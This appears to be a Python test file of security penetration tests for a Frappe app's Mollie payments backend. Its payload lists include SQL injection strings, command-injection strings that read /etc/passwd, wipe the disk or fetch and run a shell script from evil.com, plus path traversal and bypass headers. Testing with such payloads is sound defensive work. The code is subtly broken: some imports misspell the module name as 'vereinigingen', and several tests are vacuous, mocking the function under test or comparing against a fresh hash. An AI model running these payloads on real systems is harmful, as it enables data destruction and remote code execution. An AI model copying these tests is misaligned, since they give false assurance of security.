"""
Security Penetration Testing for Mollie Backend API
Tests system security against various attack vectors
"""

import base64
import hashlib
import hmac
import json
import random
import string
import time
from datetime import datetime, timedelta
from typing import Dict, List
from unittest.mock import MagicMock, patch

import frappe
from frappe.tests.utils import FrappeTestCase

from verenigingen.verenigingen_payments.core.security.encryption_handler import EncryptionHandler
from verenigingen.verenigingen_payments.core.security.mollie_security_manager import (
    MollieSecurityManager,
)
from verenigingen.verenigingen_payments.core.security.webhook_validator import WebhookValidator


class TestSecurityPenetration(FrappeTestCase):
    """
    Security penetration tests for Mollie Backend API
    
    Tests:
    - Authentication bypass attempts
    - Injection attacks (SQL, NoSQL, Command)
    - Webhook tampering and replay attacks
    - Encryption vulnerabilities
    - Rate limiting bypass
    - Privilege escalation
    - Data leakage prevention
    """
    
    @classmethod
    def setUpClass(cls):
        """Set up security test environment"""
        super().setUpClass()
        
        # Create test settings with security features enabled
        if not frappe.db.exists("Mollie Settings", "Security Test"):
            settings = frappe.new_doc("Mollie Settings")
            settings.gateway_name = "Security Test"
            settings.secret_key = "sec_test_key_" + "x" * 32
            settings.profile_id = "pfl_sec_test"
            settings.enable_backend_api = True
            settings.enable_encryption = True
            settings.enable_audit_trail = True
            settings.webhook_secret = "webhook_secret_123"
            settings.insert(ignore_permissions=True)
            frappe.db.commit()
    
    def setUp(self):
        """Set up test case"""
        super().setUp()
        self.settings_name = "Security Test"
        self.security_manager = MollieSecurityManager(self.settings_name)
        self.encryption_handler = EncryptionHandler()
        self.webhook_validator = WebhookValidator(self.settings_name)
    
    def test_sql_injection_attempts(self):
        """Test protection against SQL injection attacks"""
        
        # Common SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE tabMollie_Audit_Log; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM tabUser--",
            "1; UPDATE tabMollie_Settings SET secret_key='hacked'--",
            "' OR 1=1--",
            "'; EXEC xp_cmdshell('net user hack3r password /add')--"
        ]
        
        from verenigingen.vereinigingen_payments.workflows.reconciliation_engine import (
            ReconciliationEngine
        )
        
        engine = ReconciliationEngine(self.settings_name)
        
        for payload in sql_payloads:
            # Try to inject via various input points
            
            # Test 1: Via settlement ID
            with self.assertRaises((frappe.ValidationError, Exception)):
                engine.process_settlement(payload)
            
            # Test 2: Via search parameters
            try:
                results = frappe.db.sql(
                    """
                    SELECT name FROM `tabPayment Entry`
                    WHERE reference_no = %s
                    """,
                    (payload,),
                    as_dict=True
                )
                # Should return empty, not error
                self.assertEqual(len(results), 0)
            except Exception as e:
                # Should handle gracefully
                self.assertNotIn("DROP", str(e))
                self.assertNotIn("UPDATE", str(e))
            
            # Test 3: Via doctype operations
            try:
                doc = frappe.new_doc("Mollie Audit Log")
                doc.event_type = payload
                doc.message = "Test"
                doc.insert(ignore_permissions=True)
                # Should escape properly
                self.assertEqual(doc.event_type, payload)
                doc.delete()
            except Exception:
                pass  # Expected for some payloads
        
        # Verify database integrity
        tables_exist = frappe.db.sql("""
            SELECT COUNT(*) as count
            FROM information_schema.tables
            WHERE table_schema = DATABASE()
            AND table_name = 'tabMollie Audit Log'
        """, as_dict=True)
        
        self.assertEqual(tables_exist[0]['count'], 1, "Table was dropped!")
    
    def test_nosql_injection_attempts(self):
        """Test protection against NoSQL injection in JSON operations"""
        
        # NoSQL injection payloads
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.password == 'admin'"},
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}}
        ]
        
        for payload in nosql_payloads:
            # Test JSON field operations
            try:
                doc = frappe.new_doc("Mollie Audit Log")
                doc.event_type = "test"
                doc.message = "test"
                doc.details = json.dumps(payload)
                doc.insert(ignore_permissions=True)
                
                # Verify it's stored as string, not executed
                retrieved = frappe.get_doc("Mollie Audit Log", doc.name)
                details = json.loads(retrieved.details)
                
                # Should be stored as-is, not evaluated
                if isinstance(payload, dict) and "$ne" in payload:
                    self.assertIn("$ne", details)
                
                doc.delete()
                
            except Exception:
                pass  # Some payloads might fail validation
    
    def test_command_injection_attempts(self):
        """Test protection against command injection"""
        
        # Command injection payloads
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "& net user",
            "`rm -rf /`",
            "$(curl evil.com/shell.sh | bash)",
            "../../../etc/passwd",
            "....//....//....//etc/passwd"
        ]
        
        for payload in cmd_payloads:
            # Test file operations
            try:
                # Attempt to use payload in file paths
                result = self.encryption_handler.encrypt_data(payload)
                # Should encrypt without executing
                self.assertIsInstance(result, str)
                
            except Exception:
                pass  # Expected for invalid inputs
            
            # Test in API operations
            with patch('subprocess.run') as mock_run:
                # Ensure no subprocess calls are made
                try:
                    # Simulate operations that might call external commands
                    self.security_manager.validate_api_key(payload)
                except Exception:
                    pass
                
                # No commands should be executed
                mock_run.assert_not_called()
    
    def test_webhook_tampering_protection(self):
        """Test protection against webhook tampering"""
        
        # Valid webhook
        valid_body = json.dumps({
            "id": "tr_123",
            "amount": {"value": "100.00", "currency": "EUR"}
        }).encode()
        
        valid_signature = self.webhook_validator._compute_signature(
            valid_body,
            b"webhook_secret_123"
        )
        
        # Test 1: Modified body
        tampered_body = json.dumps({
            "id": "tr_123",
            "amount": {"value": "10000.00", "currency": "EUR"}  # Changed amount
        }).encode()
        
        is_valid = self.webhook_validator.validate_webhook(tampered_body, valid_signature)
        self.assertFalse(is_valid, "Tampered webhook accepted!")
        
        # Test 2: Reused signature with different body
        different_body = json.dumps({
            "id": "tr_456",
            "amount": {"value": "100.00", "currency": "EUR"}
        }).encode()
        
        is_valid = self.webhook_validator.validate_webhook(different_body, valid_signature)
        self.assertFalse(is_valid, "Signature reuse accepted!")
        
        # Test 3: Forged signature
        forged_signature = base64.b64encode(b"forged_signature").decode()
        
        is_valid = self.webhook_validator.validate_webhook(valid_body, forged_signature)
        self.assertFalse(is_valid, "Forged signature accepted!")
        
        # Test 4: Timing attack resistance
        import time
        
        # Measure validation times
        times = []
        
        for i in range(10):
            # Create signatures with increasing differences
            test_sig = valid_signature[:-i] + "x" * i if i > 0 else valid_signature
            
            start = time.perf_counter()
            self.webhook_validator.validate_webhook(valid_body, test_sig)
            elapsed = time.perf_counter() - start
            times.append(elapsed)
        
        # Check for constant-time comparison
        # Times should not correlate with signature similarity
        avg_time = sum(times) / len(times)
        variance = sum((t - avg_time) ** 2 for t in times) / len(times)
        
        # Low variance indicates constant-time comparison
        self.assertLess(variance, 0.0001, "Possible timing attack vulnerability")
    
    def test_replay_attack_prevention(self):
        """Test protection against replay attacks"""
        
        # Create valid webhook
        webhook_body = json.dumps({
            "id": "tr_replay_test",
            "timestamp": datetime.now().isoformat(),
            "amount": {"value": "500.00", "currency": "EUR"}
        }).encode()
        
        signature = self.webhook_validator._compute_signature(
            webhook_body,
            b"webhook_secret_123"
        )
        
        # First request should succeed
        with patch.object(self.webhook_validator, '_check_replay') as mock_replay:
            mock_replay.return_value = True
            is_valid = self.webhook_validator.validate_webhook(webhook_body, signature)
            self.assertTrue(is_valid)
        
        # Store as processed
        self.webhook_validator._store_processed_webhook(
            hashlib.sha256(webhook_body).hexdigest()
        )
        
        # Replay attempt should fail
        with patch.object(self.webhook_validator, '_check_replay') as mock_replay:
            mock_replay.return_value = False
            is_valid = self.webhook_validator.validate_webhook(webhook_body, signature)
            self.assertFalse(is_valid, "Replay attack not prevented!")
    
    def test_encryption_vulnerabilities(self):
        """Test for encryption vulnerabilities"""
        
        # Test 1: Weak key detection
        weak_keys = [
            "password123",
            "12345678",
            "00000000000000000000000000000000",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        ]
        
        for weak_key in weak_keys:
            with self.assertRaises((ValueError, Exception)):
                # Should reject weak keys
                self.encryption_handler._derive_key(weak_key.encode(), b"salt")
        
        # Test 2: Ensure proper IV usage (no IV reuse)
        data = "sensitive_data"
        encrypted1 = self.encryption_handler.encrypt_data(data)
        encrypted2 = self.encryption_handler.encrypt_data(data)
        
        # Same data should produce different ciphertexts (different IVs)
        self.assertNotEqual(encrypted1, encrypted2, "IV reuse detected!")
        
        # Test 3: Padding oracle attack prevention
        encrypted = self.encryption_handler.encrypt_data("test_data")
        
        # Tamper with padding
        tampered = encrypted[:-2] + "xx"
        
        with self.assertRaises(Exception):
            # Should fail safely without revealing padding info
            self.encryption_handler.decrypt_data(tampered)
        
        # Test 4: Key rotation verification
        old_key = self.security_manager.current_api_key
        
        # Rotate key
        new_key = self.security_manager.rotate_api_key()
        
        self.assertNotEqual(old_key, new_key, "Key rotation failed!")
        
        # Old key should be invalidated
        with patch.object(self.security_manager, 'validate_api_key') as mock_validate:
            mock_validate.return_value = False
            is_valid = self.security_manager.validate_api_key(old_key)
            self.assertFalse(is_valid, "Old key still valid after rotation!")
    
    def test_rate_limiting_bypass_attempts(self):
        """Test resistance to rate limiting bypass attempts"""
        
        from vereinigingen.vereinigingen_payments.core.resilience.rate_limiter import RateLimiter
        
        limiter = RateLimiter(requests_per_second=10, burst_size=20)
        
        # Test 1: Header manipulation
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "10.0.0.1"},
            {"Client-IP": "172.16.0.1"}
        ]
        
        for headers in bypass_headers:
            # Headers shouldn't affect rate limiting
            for _ in range(25):  # Exceed limit
                can_proceed, _ = limiter.check_rate_limit("test_endpoint")
            
            # Should be rate limited regardless of headers
            can_proceed, _ = limiter.check_rate_limit("test_endpoint")
            self.assertFalse(can_proceed, f"Rate limit bypassed with headers: {headers}")
        
        # Test 2: Endpoint variation
        similar_endpoints = [
            "/api/v1/balances",
            "/api/v1/balances/",
            "/api/v1//balances",
            "/api/v1/./balances",
            "/API/V1/BALANCES"
        ]
        
        # Reset limiter
        limiter = RateLimiter(requests_per_second=1, burst_size=2)
        
        # All variations should share the same limit
        for endpoint in similar_endpoints:
            can_proceed, _ = limiter.check_rate_limit(endpoint)
        
        # Should be limited after variations
        can_proceed, _ = limiter.check_rate_limit("/api/v1/balances")
        self.assertFalse(can_proceed, "Rate limit bypassed via endpoint variation!")
    
    def test_privilege_escalation_attempts(self):
        """Test protection against privilege escalation"""
        
        # Test 1: Role manipulation
        test_user = frappe.session.user
        
        # Try to escalate privileges
        escalation_attempts = [
            {"role": "System Manager"},
            {"role": "Administrator"},
            {"roles": ["System Manager", "Administrator"]},
            {"__roles": ["Administrator"]}
        ]
        
        for attempt in escalation_attempts:
            # Attempt to modify user roles
            try:
                frappe.db.set_value("User", test_user, attempt)
                frappe.db.commit()
                
                # Verify roles weren't changed
                actual_roles = frappe.get_roles(test_user)
                self.assertNotIn("Administrator", actual_roles, "Privilege escalation successful!")
                
            except frappe.PermissionError:
                pass  # Expected
            
        # Test 2: Permission bypass via API
        from vereinigingen.vereinigingen_payments.workflows.financial_dashboard import (
            get_dashboard_data
        )
        
        # Mock insufficient permissions
        with patch('frappe.has_permission') as mock_perm:
            mock_perm.return_value = False
            
            with self.assertRaises((frappe.PermissionError, Exception)):
                # Should check permissions
                get_dashboard_data()
    
    def test_data_leakage_prevention(self):
        """Test prevention of sensitive data leakage"""
        
        # Test 1: Error messages shouldn't reveal sensitive info
        try:
            # Trigger an error with sensitive data
            self.security_manager.validate_api_key("invalid_key_with_secret_123")
        except Exception as e:
            error_msg = str(e)
            # Should not contain the actual key
            self.assertNotIn("invalid_key_with_secret_123", error_msg)
            self.assertNotIn("secret", error_msg.lower())
        
        # Test 2: Logs shouldn't contain sensitive data
        sensitive_data = {
            "api_key": "live_secret_key_123",
            "password": "user_password",
            "iban": "NL91ABNA0417164300",
            "credit_card": "4111111111111111"
        }
        
        # Log with sensitive data
        from vereinigingen.vereinigingen_payments.core.compliance.audit_trail import (
            AuditEventType,
            AuditSeverity,
            AuditTrail
        )
        
        audit = AuditTrail()
        audit.log_event(
            AuditEventType.API_KEY_ROTATED,
            AuditSeverity.INFO,
            "Test message",
            details=sensitive_data
        )
        
        # Retrieve log
        logs = frappe.get_all(
            "Mollie Audit Log",
            filters={"event_type": "API_KEY_ROTATED"},
            fields=["details"],
            limit=1
        )
        
        if logs:
            details = json.loads(logs[0]["details"] or "{}")
            # Sensitive data should be masked
            if "api_key" in details:
                self.assertNotIn("live_secret_key_123", details.get("api_key", ""))
            if "password" in details:
                self.assertIn("***", details.get("password", ""))
        
        # Test 3: API responses shouldn't leak internal details
        with patch('frappe.throw') as mock_throw:
            mock_throw.side_effect = Exception("Database connection failed at 192.168.1.100:3306")
            
            try:
                self.security_manager.validate_webhook_signature("test", "test")
            except Exception as e:
                # Should not reveal internal IPs or ports
                self.assertNotIn("192.168", str(e))
                self.assertNotIn("3306", str(e))
    
    def test_authentication_bypass_attempts(self):
        """Test resistance to authentication bypass attempts"""
        
        # Test 1: Null byte injection
        null_payloads = [
            "admin\x00",
            "test\x00ignored",
            "valid_key\x00' OR '1'='1"
        ]
        
        for payload in null_payloads:
            is_valid = self.security_manager.validate_api_key(payload)
            self.assertFalse(is_valid, f"Null byte bypass succeeded: {payload}")
        
        # Test 2: Type confusion
        type_confusion_payloads = [
            None,
            True,
            False,
            0,
            1,
            [],
            {},
            {"key": "value"}
        ]
        
        for payload in type_confusion_payloads:
            try:
                is_valid = self.security_manager.validate_api_key(payload)
                self.assertFalse(is_valid, f"Type confusion bypass: {type(payload)}")
            except (TypeError, AttributeError):
                pass  # Expected for non-string types
        
        # Test 3: Length extension attack
        valid_key = "test_key"
        extended_key = valid_key + "\x00" * 100 + "admin"
        
        is_valid = self.security_manager.validate_api_key(extended_key)
        self.assertFalse(is_valid, "Length extension attack succeeded!")
    
    def test_session_security(self):
        """Test session security measures"""
        
        # Test 1: Session fixation prevention
        old_session = frappe.session.sid if hasattr(frappe.session, 'sid') else None
        
        # Simulate login
        with patch('frappe.auth.LoginManager'):
            # After authentication, session ID should change
            new_session = frappe.generate_hash()
            self.assertNotEqual(old_session, new_session, "Session fixation vulnerability!")
        
        # Test 2: Session timeout
        from datetime import datetime, timedelta
        
        # Create old session
        session_data = {
            "user": "test@example.com",
            "created_at": datetime.now() - timedelta(hours=25)  # Expired
        }
        
        # Should be invalidated
        with patch('frappe.cache') as mock_cache:
            mock_cache.get.return_value = session_data
            
            # Session should be expired
            is_valid = datetime.now() - session_data["created_at"] < timedelta(hours=24)
            self.assertFalse(is_valid, "Expired session still valid!")
    
    def test_input_validation_boundaries(self):
        """Test input validation with boundary values"""
        
        # Test 1: String length limits
        long_strings = [
            "x" * 10000,  # 10KB
            "y" * 100000,  # 100KB
            "z" * 1000000  # 1MB
        ]
        
        for long_string in long_strings:
            try:
                # Should handle or reject gracefully
                result = self.encryption_handler.encrypt_data(long_string[:4096])  # Limit to 4KB
                self.assertIsNotNone(result)
            except Exception:
                pass  # Expected for very long strings
        
        # Test 2: Numeric boundaries
        numeric_tests = [
            -999999999999,
            0,
            0.0000001,
            999999999999,
            float('inf'),
            float('-inf'),
            float('nan')
        ]
        
        for num in numeric_tests:
            try:
                # Should validate numeric inputs
                from vereinigingen.vereinigingen_payments.core.compliance.financial_validator import (
                    FinancialValidator
                )
                validator = FinancialValidator()
                
                if num in [float('inf'), float('-inf'), float('nan')]:
                    with self.assertRaises(ValueError):
                        validator.validate_amount(num, "EUR")
                
            except ValueError:
                pass  # Expected for invalid numbers
    
    def tearDown(self):
        """Clean up test data"""
        # Clean up test audit logs
        frappe.db.delete("Mollie Audit Log", {"reference_id": ["like", "%test%"]})
        frappe.db.commit()
        super().tearDown()